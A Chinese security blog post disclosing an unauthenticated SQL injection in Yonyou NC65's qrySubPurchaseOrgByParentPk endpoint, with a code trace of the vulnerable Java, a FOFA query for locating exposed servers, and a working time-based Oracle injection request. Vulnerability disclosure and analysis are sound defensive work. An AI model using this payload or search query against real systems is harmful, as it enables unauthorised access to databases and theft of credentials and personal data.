---
title: "用友NC qrySubPurchaseOrgByParentPk SQL注入漏洞"
source: https://mrxn.net/jswz/yonyou-nc-ebvp-register-qrySubPurchaseOrgByParentPk-sqli.html
asset_dir: assets/用友nc-qrysubpurchaseorgbyparentpk-sql注入漏洞
---

# 用友NC qrySubPurchaseOrgByParentPk SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/6/12 08:25
- 1363浏览
- [0评论](#comment)
- 25分钟阅读

深入探索

编程语言教程

授权

企业安全咨询

---

# 漏洞简介

[用友](https://mrxn.net/tag/用友)NC 是一种商业级的企业资源规划，为企业提供全面的管理解决方案，包括财务管理、采购管理、销售管理、人力资源管理等功能，基于云原生架构，深度应用新一代数字技术，打造开放、 互联、融合、智能的一体化云平台，支持公有云、混合云、专属云的灵活部署模式。聚焦数字化管理、数字化经营、数字化平台等三大企业数字化转型战略方向，提供涵盖数字营销、智能制造、财务共享、人力共享与协同，智慧采购、数字中台等18大解决方案，助力大型企业全面落地数字化和业务流程优化。用友NC电子商务平台的 `qrySubPurchaseOrgByParentPk` 接口存在[SQL注入](https://mrxn.net/tag/SQL注入)漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。

SQL注入防护

# 影响版本

NC65

# fofa语法

> `app="用友-UFIDA-NC"`

# 漏洞分析

直接看 `RegCommonController` 对应的 `doQuerySubPurchaseOrgByParentPk` 方法实现部分

```
public Object doQuerySubPurchaseOrgByParentPk(HttpServletRequest request, HttpServletResponse response) {
        String pkGroup = request.getParameter("pk_group");
        String strOrgFilter = request.getParameter("org_filter");
        List<OrgVO> orgList = null;
        List<OrgPOJO> orgPojoList = new ArrayList();

        try {
            orgList = this.getSRMRegisterQueryService().queryRegisterOrgsFilterByName(pkGroup, strOrgFilter);
            if (orgList == null || orgList.size() == 0) {
                return orgPojoList;
            }
```

深入探索

传输层安全性协议

文件大小转换

漏洞扫描服务

用户可控参数 `pk_group` 未经任何处理或校验过滤就直接带入 `queryRegisterOrgsFilterByName` 方法

```
public List<OrgVO> queryRegisterOrgsFilterByName(String pkGroup, String filterName) throws BusinessException {
        List<OrgVO> retVoList = new ArrayList();
        Map<String, RegisterOrgVO> pkOrgMap = this.queryRegisterOrgs(pkGroup);
        if (pkOrgMap != null && pkOrgMap.size() != 0) {
            Set<String> keySet = pkOrgMap.keySet();
```

又被带入 `queryRegisterOrgs` 方法，跟进

代码安全审计

```
public Map<String, RegisterOrgVO> queryRegisterOrgs(String pk_group) throws BusinessException {
        if (pk_group != null && !pk_group.isEmpty()) {
            Map<String, RegisterOrgVO> registerOrgs = new HashMap();
            SqlBuilder sql = new SqlBuilder();
            sql.append(" and ");
            sql.append("pk_group", pk_group);
            sql.append(" and ");
            sql.append("cregisterorgid", " != ", pk_group);
            sql.append(" and ");
            sql.append("enablestate", 2);
            RegisterOrgVO[] vos = null;

            try {
                VOQuery<RegisterOrgVO> query = new VOQuery(RegisterOrgVO.class);
                vos = (RegisterOrgVO[])query.query(sql.toString(), (String)null);
```

很明显的直接将参数拼接进sql语句中，造成[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

而权限校验部分可以参考 [用友NC pkevalset SQL注入漏洞](https://mrxn.net/jswz/yonyou-nc-evalschedule-pkevalset-sqli.html) 部分

[![用友NC qrySubPurchaseOrgByParentPk SQL注入漏洞](images/img-001-83a95057bf3c.webp)](https://image.mrxn.net/519dfcacc3ce40d7960ec19110f97b71.webp)

# 漏洞复现

```
POST /ebvp/register/qrySubPurchaseOrgByParentPk HTTP/1.1
Host: nc65.mrxn.net
Content-Type: application/x-www-form-urlencoded

pk_group=1' AND 1337=DBMS_PIPE.RECEIVE_MESSAGE('any',3)--
```

[![用友NC qrySubPurchaseOrgByParentPk SQL注入漏洞](images/img-002-723356a523ce.webp)](https://image.mrxn.net/76192865ea6b4371845183a61ee78145.webp)

成功延时 3 秒

漏洞预警服务

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#0day](https://mrxn.net/tag/0day)
- [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAANaElEQVR4Aeya0Zrbxg6D8/f93zkNBobEoUey17uJfaHzFQUJgtSsKMXe5vz369ev31/F7/K/3ptS17+Sf3WG/JmvuCJ65+pRrLpYUCwoXkG1imc81X8WayG//gx8Cn8GPf1Pn5nGrq9y4BeQlu1sEdKTfMXAcsZZL7ine8A6mI/qq3PE+4jTOxaS5OL334FpIeAnAGb+yjHBvY964NjXnyawN3pm91w62Kt4BZjr4DyzxKs+aaoJigXFguJHAF8HZu5900J68cr//R34sYXoSRH6jwB+IlQTjupgH+wcr/oE2GtAyuOzQnVhE2+BNOGWbp9HwOiLDiQcOuy5+oUYgM0DTDPjeZV/bCGvHuDqm+/AtxYCzNNKBoynSE+WUEojlCaM5PYv5RXgGbfy9iQmh70Oe6x65sCsqyakHpYGsxecw8y1R32B9MSv8rcW8upFr77jOzAtRBte4ahd3tTAT1HyMMw6OAfz2QzVhMzqrFrHkQd8PZi5+5VnpuKfQmZ27vOnhfTiy/nV+PIdGAuB+amBdd6vAvs3jNTyBPQcPLPX4xOnBvZKE2DOpVUANZ1iYPlZ1q+lfGosiWpCkZYhcKcD4/pwzmkcC0ly8fvvwH/a/FexOnZmgJ+E7kk9es1rnLoY1rNUq1B/zRWDe1UTpD2CfMIjX6/Dfq3UNOcVXG9I7uCH8LQQ8KbB3M8I1sHc68rzVCiugLkH9hwcg7n2Kc5MmOvgHHaW/6cBnp+54DznCoN12Ln3JD/i/4CtlsERgPGBlLzXlacWhrkHznP1aY6gWFAsKK6QVpHamQa+PpjjhXUO1mH/wpKeXC8M9iaPrzLMnnjD4DqYpzckpovfdwfGhzp4O2DOcbLp5DDXwTns3HvSe6QDsWz/aQQYb2bvAetgrnWYNZjz7SK3IL1gn+RoYWkC7B7lHXBfh1l7NDP16w3pd/fN+bSQbKmfCbzt1CvHG63nR3r1geeDObXGdynYD2w1YHq7YJ3DrOucYG0bdgtUE27p9iYnP2P1CfGAryFNiB6eFhLx4vfdgfEtS5sSYL091QRwPccFEo6nEo7zGIHh1TwBjr/NgL3plb9ipUfrDJ6V/tTBOhBpnA/2fCvcAmB4bumSch2wF8xd7/n1hixv5/vE8S0rl+/bAm8VzL2uPL1hWHth1uOvDPZUrcbgOphrLbHOJIA9iitgras/PsUC2Ku4Ir7OQLWNOJ6RPPGv6w154ib9S8v4DMkFgdM/G8H1uvXE4T4renhVjxZP59TDvQ6kNM4Pe54CMGrpXenROsPcC87BHL9mgzWYWTUBrKen8/WG9Dvy5nwsBLw1bfAZgP06OzgGc/pVE8A6mKVVgHXYudZrfDRbOrhfcQVYzxyY83hTP2Nw71lPauGjeamDZ8Y3FpLk4vffgelbVo4D3hqYu163m/jIc1SPXxxPGNbXlVcA1+OXFoBrybsnOdjHjeM/496b/JmeM0+tXW9IvRsfEI+FZNPgp+boXPHVOrhnVZMPXFdcUf2w9sCswzoH6ugpBpbfrnL9MNgH9//loHumC/xJwL1/wnEtcA733GclD09fezVwBbgfDD54/GBPBkf/CsM8o89K3lnXiKZYgHmWNAGsKxbAufqVV4Br0eQRkq9YdSE1xUJymGdGD483JMnF778DpwvRZoUcU3GF9OSKBZifgNQ7yxuc1eRJXXEF+FqqR1dcET2c2irvtXjC4OslD9c+sCcaOI+3M7gO5tOF9OYr//t3YHztBW8nWw2D9RwD5lw6zFrvBdfBrJ4K+WFdqz7FsPaBdUC2JYDpAzcmsJ68ss4mwOyRJlRvj2Hdoz4hfsVC8usNyZ34EF4uBJ7bbv0ZtGUB3Ku4onp7HB+4F8zdd5Srv9dgniFPxZEf6KW7HJjeNnAuY71GjVUTYPfWPN7lQmS88K078HLzWEi2A95e8j4VXK96vOBa8upZxWA/7BxfZsBeA1LeOD4JNV7lwOFTLb+QGTB7o4flXQHmPtjzlb9qYO9YSC1c8XvvwOlv6nkiwNvr+eroYC+Y40lvz6NXBvdWrcaZsWJwL8wcb+b0XHrXkr/CmlcBPk/VVvH1hrxyt/9iz/g9pM8HbxPMqcM6B2K5+z+RAdOf3THCrAMpbQxMvfA4T/Pq6ZMGnhFfGEi4XVN+YSvcAmkVN3kiYJsDbDXgVL/ekO1WfUYwFgLeWrbejxa9s3zRFK+QejiemtdY9eRhaSukXnnlkwb+GRUL6YFdhz2WB85zeYTMqnG0sGpCz6VVjIVU4YrfewfGQvrWep4jwvzERBenB2YPOIeZ1SOoD9Y11SvkFaqmGBA9BfULZ2bVhTOPasD4PFDcAcc1eTVfUFwxvvbCeXMaNEBI/gqrX0gv+C+6pAXw3HkyQ32Jw+AZYJZHAOfxPcMw94BzzRNWM6QLq9qZNt6QI8Ol//s7MC0EvHkw5zjgHGZOXQyuKV5BT4sA9oFZWvxgrefyCLCug3UgrRurT9iEg0CeIJZHOXD3RxZYg5kzE9Z66tNCIl78vjuw/MWwPxk5XvTK4I0feaLD7IteOXOj9bzrtZ44HC/4umDu9fgqg73R0gOznnpYvhqf5fF1vt6QfkfenI9vWf0MMD8J2rQAsw701oe55ggxAuPPYdhZdQGsxdsZ7utwr/U+5TD7wDns3/rAmvyCzlQhrSP1roNnpR6OL/n1huSOfAiffoZkazlrcvC2pUdTXAH2HNXjTb1yr8E8C5xXX43rrMSph6NXTg3m+V2HuQ57Do7BnN4wWIeZU7/ekNyJD+HxGZKn5NGZwFutfrjXNKd6ag72SxMA0QRgfK5M4p8E1vqf0vYPrD05D8x1cA77Z0e84W34LTjSgZtjp+7teZzA+Jnf8IbkCBev7sD4DAFvp28PrIO51zUwGtgjrQKsgzn+ytX/lTgznukBX//MC/aA+cx7VMuZwjDPgjmPL/OuNyR34kN4Wgh4e2Du2wPrObvqMGvgHMzyVID1zHiG09+94FlAL205MP5s7jPgXo8nvA25BdHBvTd5+mtrmGvxhDMjDPYnnxaSpovfdweeWki2FwZvFe6/meRHiTc5uGeVw1xLL1gHc3pTD0sHe6omPQDXk8cHuw6OwRwvzHl6Uw9HF0d7lsHXmL72apCQIWDTUS4vzB5pAqx11YTMrAxzT62tYrC/zgNrYFZtBXB9NTd+sCd593Yd6JYtX3lh96f+1BuyTb2Cv34HxkKA8cEH5lw1WwPrycNArFM/3Oub8RbUGYlvpW1W9M7xRVeeuLNqK3Rfzbsf2M4E9PKWawYwvBGlCcnBdWlC18dCIl78/jswfjF8dAxtUgBvd+VXvSKeaOBeMKcuBmvxhsG6PAI4B7O04LsMngk7Z2bOkxx2D+xx6mKwrngFWNevN2R1t96ojW9ZuX6ehHD0cHTYtxstHthr0cTxhaUF0cC9YI4eX/hIT10MnqFYgDmX1pG54dRh3dt98VcG94I5taPe6w3JHfoQHp8hR9sCbxVmPjt7nwXnvfKDPYqFs/m1Bu4DqnwaA9O3oJjPrqtaRXrAs1KD539RzoxwZlxvSO7Ih/BYCHjTMHO2dsbgnqOfp/eufPGAZ/U8PV1PnroYPEPxCumBex/M2plXsx/V5QnAs3tP8vjGQpJc/P47sPyWlWOBtwprjq8y2JvNg/N44D5PLQz29Bkw6/HLV2PlQfRXGObrwZxn5tm1UgvDekZmXW9I7sSH8PiWlbPAvL1stXP1Jw7HC54VHZz3unJwLd7O8lSA/WCWHxyDWVpF+mGuw5yrB6z9/v17/OUTrHN5Bdjr4BjMqguwzmHWrzdEd+uDMBaSpycM89ZyXpj1+MXgGpjTE5ZHANcVC6qLBcUVYG/VVjGwkpeariP0Iuy/Q6QGjN9Z5BfAea/XPHEY5h7NEVJXLCQfC0kSlkFIHpZWAaS0ceqb8CAAxg8N9zfk0azUK+dysM+F+7j2KE5fZelCNMVC8rA0Qbl4BdVWgPlsy4WsGi/t39yB8bUX5i3BeV6PBvbmqQDn1VPj+KIlF3ct+SMG7iyat0KMwHgzk8sLs5ZaZ3mFrtcc1rNgrWuecL0h9S5+QDwWos08g35e9aw06R3xgZ8Q2LnXeg72Ru+sa3UtOax71SNUX2LpArgXzKmDc3kEcJ66WLqguELaCuAZYyG14YrfewemhYC3BDOfHTHbjgfmXnCeerj3SY8G7kmu2gpgH+zcfZkB9vS8+2seb7jWFMM8s2rgGphVE+A8nxaihgt//w6cXeFbCwFvG3bO0xTuF1/psPcDvWX85wv1AeObkeJHAHv7MFjr3acc1t5+bXmPEG/qyWGeHf1bC8lFLv65O/BjC8mGwZsHc44KzmFm1dPbGeyVpwLudbAG5sxKX/Jw9HB0MaxnxAuugzm6WP2CYgHskSaAc9UqwPqPLaQOv+LX78C0EG1whaPx8p7VVH8G4Kcjs+A8z8z4xStNOqxnrfyw9mqOAK6velWveOTp9eTTQurAK37PHRgLAW8ezvnsiODebDpesA7HHG+4z0gejg/2mdE6957k4N7uVx5PGOxNLo+QHPa6dAGsKa5IT9VqPBZShSt+7x34HwAA//+mKERHAAAABklEQVQDAFeTObzTvijBAAAAAElFTkSuQmCC)

手机扫码阅读
